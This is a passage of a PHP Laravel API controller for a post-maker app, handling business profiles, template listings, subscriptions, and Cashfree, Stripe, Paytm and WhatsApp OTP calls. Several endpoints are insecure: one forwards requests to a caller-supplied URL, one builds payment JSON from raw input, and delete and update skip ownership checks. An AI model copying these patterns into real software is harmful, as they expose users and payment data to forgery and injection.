                    "height" => $c->height,
                    "width" => $c->width,
                    "image_type" => $c->image_type,
                    "aspect_ratio" => $c->aspect_ratio,
                );
            }
        }

        foreach($custom_post as $custom)
        {
            $customPostFrame = CustomPostFrame::where("custom_post_id",$custom->id)->where('status',1)->inRandomOrder()->get();
                    
            foreach ($customPostFrame as $c) 
            {
                if($c->zip_name)
                {
                    if(StorageSetting::getStorageSetting('storage') == 'DigitalOcean')
                    {
                        $file = Storage::disk('spaces')->allFiles('uploads/template/'.$c->zip_name.'/json/');
                        $json_data = file_get_contents(Storage::disk('spaces')->url($file[0]));
                    }
                    else
                    {
                        $file = scandir('./uploads/template/'.$c->zip_name.'/json/', 1);
                        $json_data = file_get_contents(asset('uploads/template/'.$c->zip_name.'/json/'.$file[0]));
                    }
                }

                $data[] = array(
                    "postId" => $c->custom_post->name."".$c->id,
                    "id" => $c->custom_post_id,
                    "type" => "custom ".$c->custom_frame_type,
                    "is_template" => true,
                    "language" => $c->language->title,
                    "image" => ($c->frame_image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$c->frame_image):asset('uploads/'.$c->frame_image)):"",
                    "is_paid" => ($c->paid==1)?true:false,
                    "height" => $c->height,
                    "width" => $c->width,
                    "image_type" => $c->image_type,
                    "aspect_ratio" => $c->aspect_ratio,
                    "name" => ($c->zip_name)?$c->zip_name:"",
                    "json" => ($c->zip_name)?$json_data:"",
                );
            }
        }

        foreach($business_category as $business)
        {
            $businessFrame = BusinessFrame::where("business_category_id",$business->id)->where('status',1)->inRandomOrder()->get();
                    
            foreach ($businessFrame as $frame) 
            {
                $data[] = array(
                    "postId" => $frame->business_category->name."".$frame->id,
                    "id" => $frame->business_category_id,
                    "type" => "business",
                    "image" => ($frame->frame_image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$frame->frame_image):asset('uploads/'.$frame->frame_image)):"",
                    "is_paid" => ($frame->paid==1)?true:false,
                    "height" => $frame->height,
                    "width" => $frame->width,
                    "image_type" => $frame->image_type,
                    "aspect_ratio" => $frame->aspect_ratio,
                );
            }
        }

        return $data;
    }

    public function getBusiness(Request $request)
    {
        $business = Business::where('user_id',$request->userId)
            ->where('status',1)
            ->orderBy('is_default', 'DESC')
            ->orderBy('id', 'ASC')
            ->get();

        if(!$business->isEmpty())
        {
            foreach ($business as $b) {
                $category = BusinessCategory::find($b->business_category_id);

                $data[] = array(
                    "id" => $b->id,
                    "name" => $b->name,
                    "email" => $b->email,
                    "logo" => ($b->logo)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$b->logo):asset('uploads/'.$b->logo)):"",
                    "mobileNo" => $b->mobile_no,
                    "website" => $b->website,
                    "address" => $b->address,
                    "businessCategory" => array(
                        "businessCategoryId" => ($category)?$category->id:"",
                        "businessCategoryName" => ($category)?$category->name:"",
                        "businessCategoryIcon" => ($category)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$category->icon):asset('uploads/'.$category->icon)):"",
                    ),
                    "isDefault" => ($b->is_default == 1)?true:false,
                    "extra_emails" => $b->extra_emails ?? [],
                    "extra_mobile_numbers" => $b->extra_mobile_numbers ?? [],
                    "extra_websites" => $b->extra_websites ?? [],
                    "extra_addresses" => $b->extra_addresses ?? [],
                    "hidden_frame_fields" => $b->hidden_frame_fields ?? [],
                    "business_category_id" => $b->business_category_id,
                );
            }
        }
        else
        {
            return $data = array();
        }
        
        return $data;
    }

    public function addBusiness(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'userId' => 'required',
            'businessCategoryId' => 'nullable',
            'bussinessName' => 'required',
            "bussinessNumber" => 'required',
            'bussinessEmail' => 'required|email|unique:business,email',
            "bussinessImage" => "nullable|mimes:jpg,png,jpeg",
            "bussinessWebsite" => 'required',
            "bussinessAddress" => 'required',
        ]);

        if ($validation->fails()) {
            $errors = [];
            foreach ($validation->errors()->messages() as $key => $value) {
                $errors[] = is_array($value) ? implode(',', $value) : $value;
            }

            return response()->json([
              'status' => "Error",
              'message' => $errors,
            ], 404);
        } 
        else {
            $business_data = Business::where('user_id',$request->get("userId"))->where('is_default',1)->get();
            if(!$business_data->isEmpty())
            {
                foreach ($business_data as $value){
                    $b = Business::find($value->id);
                    $b->is_default = 0;
                    $b->save();
                }
            }

            $id = Business::create([
                "name" => $request->get("bussinessName"),
                "email" => $request->get("bussinessEmail"),
                "mobile_no" => $request->get("bussinessNumber"),
                "address" => $request->get("bussinessAddress"),
                "website" => $request->get("bussinessWebsite"),
                "user_id" => $request->get("userId"),
                "business_category_id" => $request->get("businessCategoryId"),
                "is_default" => 1,
                "extra_emails" => $request->has('extra_emails') ? (is_string($request->get('extra_emails')) ? json_decode($request->get('extra_emails'), true) : $request->get('extra_emails')) : null,
                "extra_mobile_numbers" => $request->has('extra_mobile_numbers') ? (is_string($request->get('extra_mobile_numbers')) ? json_decode($request->get('extra_mobile_numbers'), true) : $request->get('extra_mobile_numbers')) : null,
                "extra_websites" => $request->has('extra_websites') ? (is_string($request->get('extra_websites')) ? json_decode($request->get('extra_websites'), true) : $request->get('extra_websites')) : null,
                "extra_addresses" => $request->has('extra_addresses') ? (is_string($request->get('extra_addresses')) ? json_decode($request->get('extra_addresses'), true) : $request->get('extra_addresses')) : null,
                "hidden_frame_fields" => $request->has('hidden_frame_fields') ? (is_string($request->get('hidden_frame_fields')) ? json_decode($request->get('hidden_frame_fields'), true) : $request->get('hidden_frame_fields')) : null,
            ])->id;

            if(StorageSetting::getStorageSetting("storage") == "DigitalOcean")
            {
                if ($request->file("bussinessImage") && $request->file('bussinessImage')->isValid()) {
                    $image = $request->file('bussinessImage');
                    $file = Str::uuid().'.'.$image->getClientOriginalExtension();
            
                    $path = Storage::disk('spaces')->put('uploads/'.$file, file_get_contents($image),'public');
                    
                    $user = Business::find($id);
                    $user->logo = $file;
                    $user->save();
                }
            }
            else
            {
                if ($request->file("bussinessImage") && $request->file('bussinessImage')->isValid()) {
                    $this->upload_image($request->file("bussinessImage"),"logo", $id);
                }
            }

            $business = Business::where('user_id',$request->userId)->get();

            foreach ($business as $b) {
                $category = BusinessCategory::find($b->business_category_id);

                $data[] = array(
                    "id" => $b->id,
                    "name" => $b->name,
                    "email" => $b->email,
                    "logo" => ($b->logo)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$b->logo):asset('uploads/'.$b->logo)):"",
                    "mobileNo" => $b->mobile_no,
                    "website" => $b->website,
                    "address" => $b->address,
                    "businessCategory" => array(
                        "businessCategoryId" => ($category)?$category->id:"",
                        "businessCategoryName" => ($category)?$category->name:"",
                        "businessCategoryIcon" => ($category)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$category->icon):asset('uploads/'.$category->icon)):"",
                    ),
                    "isDefault" => ($b->is_default == 1)?true:false,
                    "hidden_frame_fields" => $b->hidden_frame_fields ?? [],
                );
            }

            return $data;
        }
    }

    public function updateBusiness(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'bussinessName' => 'required',
            "bussinessNumber" => 'required',
            'bussinessEmail' => 'required|email|unique:business,email,' . $request->input("bussinessId"),
            "bussinessImage" => "nullable|mimes:jpg,png,jpeg",
            "bussinessWebsite" => 'required',
            "bussinessAddress" => 'required',
            'businessCategoryId' => 'nullable',
        ]);

        if ($validation->fails()) {
            $errors = [];
            foreach ($validation->errors()->messages() as $key => $value) {
                $errors[] = is_array($value) ? implode(',', $value) : $value;
            }

            return response()->json([
              'status' => "Error",
              'message' => $errors,
            ], 404);
        } else {

            $business = Business::whereId($request->get("bussinessId"))->first();
            if (!$business) {
                return response()->json(['status' => 'Error', 'message' => ['Business not found']], 404);
            }
            $business->name = $request->get("bussinessName");
            $business->email = $request->get("bussinessEmail");
            $business->mobile_no = $request->get("bussinessNumber");
            $business->website = $request->get("bussinessWebsite");
            $business->address = $request->get("bussinessAddress");
            // Only update category if provided, otherwise keep existing
            if ($request->filled('businessCategoryId')) {
                $business->business_category_id = $request->get("businessCategoryId");
            }
            if ($request->has('extra_emails')) {
                $business->extra_emails = is_string($request->get('extra_emails')) ? json_decode($request->get('extra_emails'), true) : $request->get('extra_emails');
            }
            if ($request->has('extra_mobile_numbers')) {
                $business->extra_mobile_numbers = is_string($request->get('extra_mobile_numbers')) ? json_decode($request->get('extra_mobile_numbers'), true) : $request->get('extra_mobile_numbers');
            }
            if ($request->has('extra_websites')) {
                $business->extra_websites = is_string($request->get('extra_websites')) ? json_decode($request->get('extra_websites'), true) : $request->get('extra_websites');
            }
            if ($request->has('extra_addresses')) {
                $business->extra_addresses = is_string($request->get('extra_addresses')) ? json_decode($request->get('extra_addresses'), true) : $request->get('extra_addresses');
            }
            if ($request->has('hidden_frame_fields')) {
                $business->hidden_frame_fields = is_string($request->get('hidden_frame_fields')) ? json_decode($request->get('hidden_frame_fields'), true) : $request->get('hidden_frame_fields');
            }
            $business->save();

            if(StorageSetting::getStorageSetting("storage") == "DigitalOcean")
            {
                if ($request->file("bussinessImage") && $request->file('bussinessImage')->isValid()) {
                    $image = $request->file('bussinessImage');
                    $file = Str::uuid().'.'.$image->getClientOriginalExtension();
            
                    $path = Storage::disk('spaces')->put('uploads/'.$file, file_get_contents($image),'public');
                    
                    $user = Business::find($request->get("bussinessId"));
                    $user->logo = $file;
                    $user->save();
                }
            }
            else
            {
                if ($request->file("bussinessImage") && $request->file('bussinessImage')->isValid()) {
                    $this->upload_image($request->file("bussinessImage"),"logo", $request->get("bussinessId"));
                }
            }

            $b = Business::find($business->id);
            $category = BusinessCategory::find($b->business_category_id);

            $data[] = array(
                "id" => $b->id,
                "name" => $b->name,
                "email" => $b->email,
                "logo" => ($b->logo)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$b->logo):asset('uploads/'.$b->logo)):"",
                "mobileNo" => $b->mobile_no,
                "website" => $b->website,
                "address" => $b->address,
                "businessCategory" => array(
                    "businessCategoryId" => ($category)?$category->id:"",
                    "businessCategoryName" => ($category)?$category->name:"",
                    "businessCategoryIcon" => ($category)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$category->icon):asset('uploads/'.$category->icon)):"",
                ),
                "isDefault" => ($b->is_default)?true:false,
                "extra_emails" => $b->extra_emails ?? [],
                "extra_mobile_numbers" => $b->extra_mobile_numbers ?? [],
                "extra_websites" => $b->extra_websites ?? [],
                "extra_addresses" => $b->extra_addresses ?? [],
                "hidden_frame_fields" => $b->hidden_frame_fields ?? [],
            );
            
            return $data;
        }
    }

    public function deleteBusiness(Request $request)
    {
        Business::find($request->bussinessId)->delete();

        return response()->json([
            'status' => "success",
            'message' => "Business Deleted Successfully!",
        ], 200);
    }

    public function setDefaultBusiness(Request $request)
    {
        $business_data = Business::where('user_id',$request->get("userId"))->where('is_default',1)->get();
        if($business_data->isEmpty())
        {
            $business = Business::find($request->get("bussinessId"));
            if(!empty($business)){
                $business->is_default = 1;
                $business->save();

                return response()->json([
                    'status' => "Success",
                    'message' => "Set Default Business!",
                ], 200);
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "Invalid Business Id!",
                ], 404);
            }
        }
        else
        {
            $business = Business::find($request->get("bussinessId"));
            if(!empty($business)){
                foreach ($business_data as $value){
                    $b = Business::find($value->id);
                    $b->is_default = 0;
                    $b->save();
                }

                $business = Business::find($request->get("bussinessId"));
                $business->is_default = 1;
                $business->save();

                return response()->json([
                    'status' => "Success",
                    'message' => "Set Default Business!",
                ], 200);
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "Invalid Business Id!",
                ], 404);
            }
        }
    }

    public function getPost(Request $request) 
    {
        
        if($request->type=="festival")
        {
            $festival = FestivalsPost::where("festivals_id",$request->id)->where('status',1)->get();

            if(!$festival->isEmpty())
            {
                $festival = FestivalsPost::where("festivals_id",$request->id)->where('status',1)->inRandomOrder()->get();
                
                foreach ($festival as $f) 
                {
                    $data[] = array(
                        "postId" => $f->festivals->title."".$f->id,
                        "id" => $f->festivals_id,
                        "type" => "festival",
                        "language" => $f->language->title,
                        "image" => ($f->frame_image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$f->frame_image):asset('uploads/'.$f->frame_image)):"",
                        "is_paid" => ($f->paid==1)?true:false,
                        "height" => $f->height,
                        "width" => $f->width,
                        "image_type" => $f->image_type,
                        "aspect_ratio" => $f->aspect_ratio,
                    );
                }

                return $data;
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "No Data Found",
                ], 404);
            }
            
        }

        if($request->type=="category")
        {
            $category = CategoryPost::where("category_id",$request->id)->where('status',1)->get();
 
            if(!$category->isEmpty())
            {
                $category = CategoryPost::where("category_id",$request->id)->where('status',1)->inRandomOrder()->get();
                
                foreach ($category as $c) 
                {
                   
                    $data[] = array(
                        "postId" => $c->category->name."".$c->id,
                        "id" => $c->category_id,
                        "type" => "category",
                        "language" => $c->language->title,
                        "image" => ($c->frame_image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$c->frame_image):asset('uploads/'.$c->frame_image)):"",
                        "is_paid" => ($c->paid==1)?true:false,
                        "height" => $c->height,
                        "width" => $c->width,
                        "image_type" => $c->image_type,
                        "aspect_ratio" => $c->aspect_ratio,
                    );
                }

                return $data;
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "No Data Found",
                ], 404);
            }
            
        }
    }

    public function getVideo(Request $request)
    {
        if($request->type=="festival")
        {
            $video = Video::where("type","festival")->where("festival_id",$request->id)->where('status',1)->get();

            if(!$video->isEmpty())
            {
                foreach ($video as $v) 
                {
                    $data[] = array(
                        "postId" => $v->festival->title."".$v->id,
                        "id" => $v->festival_id,
                        "type" => "festival",
                        "language" => $v->language->title,
                        "image" => ($v->video != null)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/video/'.$v->video):asset('uploads/video/'.$v->video)):"",
                        "is_paid" => ($v->paid==1)?true:false,
                        "video" => true,
                    );
                }
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "No Data Found",
                ], 404);
            }
            return $data;
        }

        if($request->type=="category")
        {
            $video = Video::where("type","category")->where("category_id",$request->id)->where('status',1)->get();

            if(!$video->isEmpty())
            {
                foreach ($video as $v) 
                {
                    $data[] = array(
                        "postId" => $v->category->name."".$v->id,
                        "id" => $v->category_id,
                        "type" => "category",
                        "language" => $v->language->title,
                        "image" => ($v->video != null)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/video/'.$v->video):asset('uploads/video/'.$v->video)):"",
                        "is_paid" => ($v->paid==1)?true:false,
                        "video" => true,
                    );
                }
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "No Data Found",
                ], 404);
            }
            return $data;
        }

        if($request->type=="business")
        {
            $video = Video::where("type","business")->where("business_category_id",$request->id)->where('status',1)->get();

            if(!$video->isEmpty())
            {
                foreach ($video as $v) 
                {
                    $data[] = array(
                        "postId" => $v->businessCategory->name."".$v->id,
                        "id" => $v->business_category_id,
                        "type" => "business",
                        "language" => $v->language->title,
                        "image" => ($v->video != null)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/video/'.$v->video):asset('uploads/video/'.$v->video)):"",
                        "is_paid" => ($v->paid==1)?true:false,
                        "video" => true,
                    );
                }
            }
            else
            {
                return response()->json([
                    'status' => "Error",
                    'message' => "No Data Found",
                ], 404);
            }
            return $data;
        }
    }

    public function getAppTranslations()
    {
        $languages = \App\Models\AppTranslation::where('status', 1)->get();
        if ($languages->isEmpty()) {
            return response()->json([
                'status' => "Error",
                'message' => "No Translations Found",
            ], 404);
        }
        $data = [];
        foreach ($languages as $lang) {
            $data[] = [
                'language_code' => $lang->language_code,
                'title' => $lang->title,
                'translations' => $lang->translations ?? [],
            ];
        }
        return response()->json($data);
    }


    public function getLanguage()
    {
        $language = Language::where("status",1)->get();

        if(!$language->isEmpty())
        {
            foreach ($language as $l) 
            {
                $data[] = array(
                    "id" => $l->id,
                    "title" => $l->title,
                    "image" => ($l->image)?((StorageSetting::getStorageSetting('storage') == 'DigitalOcean')?Storage::disk('spaces')->url('uploads/'.$l->image):asset('uploads/'.$l->image)):""
                );
            }
        }
        else
        {
            return response()->json([
                'status' => "Error",
                'message' => "No Data Found",
            ], 404);
        }
        return $data;   
    }

    public function getSubscriptionplan()
    {
        $subscription = Subscription::where("status",1)->get();

        if(!$subscription->isEmpty())
        {
            foreach ($subscription as $s) 
            {
                $plan_detail = unserialize($s->plan_detail);
                $planDetail = array();
                if($plan_detail != null)
                {
                    foreach($plan_detail as $val)
                    {
                        $planDetail[] = $val;
                    }
                }

                $data[] = array(
                    "id" => $s->id,
                    "planName" => $s->plan_name,
                    "duration" => $s->duration." ".$s->duration_type,
                    "planPrice" => $s->plan_price,
                    "discountPrice" => $s->discount_price,
                    "monthlyPrice" => $s->monthly_price ?? 0,
                    "monthlyDiscountPrice" => $s->monthly_discount_price ?? 0,
                    "yearlyPrice" => $s->yearly_price ?? 0,
                    "yearlyDiscountPrice" => $s->yearly_discount_price ?? 0,
                    "planDetail" => $planDetail,
                    "businessLimit" => $s->business_limit,
                    "googleProductEnable" => $s->google_product_enable,
                    "googleProductId" => $s->google_product_id,
                    "featureLimits" => [
                        "custom_post" => [
                            "base_limit" => $s->custom_post_edit_limit ?? 0,
                            "ad_reward_limit" => $s->custom_post_ad_reward_limit ?? 0,
                        ],

                        "magic_cloner" => [
                            "base_limit" => $s->magic_cloner_limit ?? 0,
                            "ad_reward_limit" => $s->magic_cloner_ad_reward_limit ?? 0,
                        ],
                        "festival_post" => [
                            "base_limit" => $s->festival_post_limit ?? 0,
                            "ad_reward_limit" => $s->festival_post_ad_reward_limit ?? 0,
                        ],
                        "business_category_post" => [
                            "base_limit" => $s->business_category_post_limit ?? 0,
                            "ad_reward_limit" => $s->business_category_ad_reward_limit ?? 0,
                        ],
                        "photoroom_bg" => [
                            "base_limit" => $s->photoroom_bg_limit ?? 0,
                        ],
                    ],
                );
            }
            return $data; 
        }
        else
        {
            return $data = array();
        }
    }

    public function create_order_cashfree(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'order_amount' => 'required',
            'customer_id' => 'required',
            'customer_name' => 'required',
            'customer_email' => 'required',
            "customer_phone" => 'required',
        ]);

        if ($validation->fails()) {
            $errors = [];
            foreach ($validation->errors()->messages() as $key => $value) {
                $errors[] = is_array($value) ? implode(',', $value) : $value;
            }

            return response()->json([
              'status' => "Error",
              'message' => $errors,
            ], 404);
        } 
        else 
        {
            $client = new \GuzzleHttp\Client();

            if(PaymentSetting::getPaymentSetting('cashfree_type') == "Live")
            {
                $url = "https://api.cashfree.com/pg/orders";
            }
            else
            {
                $url = "https://sandbox.cashfree.com/pg/orders";
            }

            $response = $client->request('POST', $url, [
              'body' => '{"customer_details":{"customer_id":"'.$request->get("customer_id").'","customer_name":"'.$request->get("customer_name").'","customer_email":"'.$request->get("customer_email").'","customer_phone":"'.$request->get("customer_phone").'"},"order_amount":'.$request->get("order_amount").',"order_currency":"'.AppSetting::getAppSetting('currency').'"}',
              'headers' => [
                'accept' => 'application/json',
                'content-type' => 'application/json',
                'x-api-version' => '2022-09-01',
                'x-client-id' => PaymentSetting::getPaymentSetting('cashfree_key_id'),
                'x-client-secret' => PaymentSetting::getPaymentSetting('cashfree_key_secret'),
              ],
            ]);
            
            $json = json_decode($response->getBody());

            return response()->json([
                'order_id' => $json->order_id,
                'cf_order_id' => $json->cf_order_id,
                'payment_session_id' => $json->payment_session_id,
            ], 200);
        }
    }

    public function stripePayment(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'order_amount' => 'required',
        ]);

        if ($validation->fails()) {
            $errors = [];
            foreach ($validation->errors()->messages() as $key => $value) {
                $errors[] = is_array($value) ? implode(',', $value) : $value;
            }

            return response()->json([
              'status' => "Error",
              'message' => $errors,
            ], 404);
        } 
        else 
        {
            try {
                $stripe = new \Stripe\StripeClient(PaymentSetting::getPaymentSetting('stripe_secret_key'));

                $customer = $stripe->customers->create();

                $ephemeralKey = $stripe->ephemeralKeys->create([
                'customer' => $customer->id,
                ], [
                'stripe_version' => '2022-08-01',
                ]);

                $paymentIntent = $stripe->paymentIntents->create([
                    'amount' => $request->order_amount*100,
                    'currency' => AppSetting::getAppSetting('currency'),
                    'customer' => $customer->id,
                    'automatic_payment_methods' => [
                        'enabled' => 'true',
                    ],
                ]);

                $data = array(
                    'paymentIntent' => $paymentIntent->client_secret,
                    'ephemeralKey' => $ephemeralKey->secret,
                    'customer' => $customer->id,
                    'publishableKey' => PaymentSetting::getPaymentSetting('stripe_publishable_Key')
                );
            } catch (\Stripe\Exception\CardException $e) {
                // Since it's a decline, \Stripe\Exception\CardException will be caught
                $error_msg = $e->getError()->message;
                $data = [
                    'status' => 'Error',
                    'message' => json_encode($error_msg)
                ];
            } catch (\Stripe\Exception\RateLimitException $e) {
                // Too many requests made to the API too quickly
                $error_msg = $e->getError()->message;
                $data = [
                    'status' => 'Error',
                    'message' => json_encode($error_msg)
                ];
            } catch (\Stripe\Exception\InvalidRequestException $e) {
                // Invalid parameters were supplied to Stripe's API
                $error_msg = $e->getError()->message;
                $data = [
                    'status' => 'Error',
                    'message' => json_encode($error_msg)
                ];
            } catch (\Stripe\Exception\AuthenticationException $e) {
                // Authentication with Stripe's API failed
                // (maybe you changed API keys recently)
                $error_msg = $e->getError()->message;
                $data = [
                    'status' => 'Error',
                    'message' => json_encode($error_msg)
                ];
            } catch (\Stripe\Exception\ApiConnectionException $e) {
                // Network communication with Stripe failed
                $error_msg = $e->getError()->message;
                $data = [
                    'status' => 'Error',
                    'message' => json_encode($error_msg)
                ];
            } catch (\Stripe\Exception\ApiErrorException $e) {
                // Display a very generic error to the user, and maybe send
                // yourself an email
                $error_msg = $e->getError()->message;
                $data = [
                    'status' => 'Error',
                    'message' => json_encode($error_msg)
                ];
            } catch (\Exception $e) {
                // Something else happened, completely unrelated to Stripe
                $error_msg = $e->getMessage();
                $data = [
                    'status' => 'Error',
                    'message' => json_encode($error_msg)
                ];
            }
            
            return response()->json($data);

            // $user = User::find($request->user_id);
            // $customer['name'] = $user->name;
            // $customer['description'] = "Festival Post Maker";
            // $customer['address']['line1'] = "Gujarat";
            // $customer['address']['postal_code'] = "360001";
            // $customer['address']['city'] = "Surat";

            // $response = $this->stripeFunction('https://api.stripe.com/v1/customers', 'POST', $customer);
        
            // $r = json_decode($response['body'], true);

            // $customer_data = array(
            //     'customer' => $r['id'], 
            //     'amount' => $request->order_amount*100, 
            //     'currency' => 'USD',
            //     'metadata' => ["order_id" => $request->order_id]
            // );

            // $response1 = $this->stripeFunction('https://api.stripe.com/v1/payment_intents','POST', $customer_data);
            
            // $res = json_decode($response1['body'], true);

            // return $res;

            // if(isset($res['client_secret']))
            // {
            //     $data = array(
            //         'publishable_Key' => PaymentSetting::getPaymentSetting('stripe_publishable_Key'),
            //         'client_secret' => $res['client_secret']
            //     );
            // }
            // else
            // {
            //     $data = [
            //         'status' => 'Error',
            //         'message' => json_encode($res)
            //     ];
            // }
            
            // return response()->json($data);
        }
    }

    public function stripeFunction($url, $method, $val = [])
    {
        $secret_key = PaymentSetting::getPaymentSetting('stripe_secret_key');
        $ch = curl_init();
        $curl_options = array(
            CURLOPT_URL => $url,
            CURLOPT_RETURNTRANSFER => 1,
            CURLOPT_HEADER => 0,
            CURLOPT_HTTPHEADER => array(
                'Content-Type: application/x-www-form-urlencoded',
                'Authorization: Basic ' . base64_encode($secret_key . ':')
            )
        );

        if ($method == 'POST') 
        {
            $curl_options[CURLOPT_POST] = 1;
            $curl_options[CURLOPT_POSTFIELDS] = http_build_query($val);
        } 
        else 
        {
            $curl_options[CURLOPT_CUSTOMREQUEST] = 'GET';
        }
        curl_setopt_array($ch, $curl_options);

        $result = array(
            'body' => curl_exec($ch),
        );
        
        return $result;
    }

    public function paytmPayment(Request $request)
    {
        $validation = Validator::make($request->all(), [
            'order_amount' => 'required',
            'order_id' => 'required',
            'user_id' => 'required',
        ]);

        if ($validation->fails()) {
            $errors = [];
            foreach ($validation->errors()->messages() as $key => $value) {
                $errors[] = is_array($value) ? implode(',', $value) : $value;
            }

            return response()->json([
              'status' => "Error",
              'message' => $errors,
            ], 404);
        } 
        else 
        {
            $paytmParams = array();

            if(PaymentSetting::getPaymentSetting('paytm_type') == "Live")
            {
                /* for Production */
                $callback_url = "https://securegw.paytm.in/theia/paytmCallback?ORDER_ID=".$request->order_id;
            }
            else
            {
                /* for Staging */
                $callback_url = "https://securegw-stage.paytm.in/theia/paytmCallback?ORDER_ID=".$request->order_id;
            }
            
            $paytmParams["body"] = array(
                "requestType"   => "Payment",
                "mid"           => PaymentSetting::getPaymentSetting('paytm_merchant_id'),
                "websiteName"   => "Hello",
                "orderId"       => $request->order_id,
                "callbackUrl"   => $callback_url,
                "txnAmount"     => array(
                    "value"     => $request->order_amount,
                    "currency"  => "INR",
                ),
                "userInfo"      => array(
                    "custId"    => $request->user_id,
                ),
            );

            $paytm_checksum = PaytmChecksum::generateSignature(json_encode($paytmParams["body"], JSON_UNESCAPED_SLASHES), PaymentSetting::getPaymentSetting('paytm_merchant_key'));

            $paytmParams["head"] = array(
                "signature"    => $paytm_checksum
            );
            
            $post_data = json_encode($paytmParams, JSON_UNESCAPED_SLASHES);
            
            if(PaymentSetting::getPaymentSetting('paytm_type') == "Live")
            {
                /* for Production */
                $url = "https://securegw.paytm.in/theia/api/v1/initiateTransaction?mid=".PaymentSetting::getPaymentSetting('paytm_merchant_id')."&orderId=".$request->order_id;
            }
            else
            {
                /* for Staging */
                $url = "https://securegw-stage.paytm.in/theia/api/v1/initiateTransaction?mid=".PaymentSetting::getPaymentSetting('paytm_merchant_id')."&orderId=".$request->order_id;
            }

            $ch = curl_init($url);
            curl_setopt($ch, CURLOPT_POST, 1);
            curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
            curl_setopt($ch, CURLOPT_RETURNTRANSFER, true); 
            curl_setopt($ch, CURLOPT_HTTPHEADER, array("Content-Type: application/json")); 

            $response = json_decode(curl_exec($ch),true);

            if($response['body']['resultInfo']['resultStatus'] == "S")
            {
                return response()->json([
                    'status' => 'success',
                    'txnToken' => $response['body']['txnToken'],
                    'callback_url' => $callback_url,
                ]);
            }
            else
            {
                return response()->json([
                    'status' => "error",
                    'message' => $response['body']['resultInfo']['resultMsg'],
                ], 404);
            }

            // $paytm_params["MID"] = PaymentSetting::getPaymentSetting('paytm_merchant_id');
            // $paytm_params["ORDER_ID"] = $request->order_id;
            // $paytm_params["CUST_ID"] = $request->user_id;
            // $paytm_params["TXN_AMOUNT"] = $request->order_amount;
            
            // $paytm_params["INDUSTRY_TYPE_ID"] = "Retail";
            // $paytm_params["CHANNEL_ID"] = "WAP";
            // $paytm_params["WEBSITE"] = "DEFAULT";
            // $paytm_params["CALLBACK_URL"] = "https://securegw.paytm.in/theia/paytmCallback?ORDER_ID=".$paytm_params["ORDER_ID"];
        
            // $paytm_checksum = PaytmChecksum::generateSignature($paytm_params, PaymentSetting::getPaymentSetting('paytm_merchant_id'));
            
            // if(!empty($paytm_checksum)){
            //     return response()->json([
            //         'status' => 'success',
            //         'message' => "Success",
            //         'signature' => $paytm_checksum,
            //         'callback_url' => $paytm_params["CALLBACK_URL"]
            //     ]);
            // }
            // else
            // {
            //     return response()->json([
            //         'status' => "Error",
            //         'message' => "Invalid Access Key"
            //     ], 404);
            // }
        }
    }

    public function verifyPaytmPayment(Request $request)
    {
        $paytm_params["body"] = array(
            "mid" => PaymentSetting::getPaymentSetting('paytm_merchant_id'),
            "orderId" => $request->order_id,
        );
        
        $checksum = PaytmChecksum::generateSignature(json_encode($paytm_params["body"]), PaymentSetting::getPaymentSetting('paytm_merchant_key'));
        
        $paytm_params["head"] = array(
            "signature"    => $checksum
        );
    
        $post_data = json_encode($paytm_params);

        $url = "https://securegw.paytm.in/v3/order/status";
    
        $ch = curl_init($url);
        curl_setopt($ch, CURLOPT_POST, 1);
        curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
        curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
        curl_setopt($ch, CURLOPT_HTTPHEADER, array('Content-Type: application/json'));
    
        $response = json_decode(curl_exec($ch),true);

        return response()->json([
            'status' => 'success',
            'message' => "Success",
            'response' => $response['body']['resultInfo']['resultStatus']
        ]);
    }

    public function whatsapp_api(Request $request)
    {
        $header = array(
            "clientId" => $request->clientId,
            "clientSecret" => $request->clientSecret,
            "Content-Type" => "application/json",
        );

        $body = '{
            "waId" : "'.$request->waId.'"
        }';

        $client = new \GuzzleHttp\Client([
            'headers' => $header
        ]);
        $response = $client->request('POST', $request->url, [
            'body' => $body
        ]);

        $res = $response->getBody()->getContents();

        return json_decode($res,true);
    }

    public function whatsapp_otp(Request $request)
    {
        $number = $request->number;
        $otp = random_int(100000, 999999);

        $data['apikey'] = WhatsAppSetting::getWhatsAppSetting('api_key');
        $data['instance'] = WhatsAppSetting::getWhatsAppSetting('instance_id');

        $sms = str_replace("[OTP]",$otp,WhatsAppSetting::getWhatsAppSetting('whatsapp_otp_message'));
        
        $data['msg'] = $sms;
        $url = "https://app.wapify.net/api/text-message.php";
        
        $data['number'] = $number;

        $ch = curl_init();
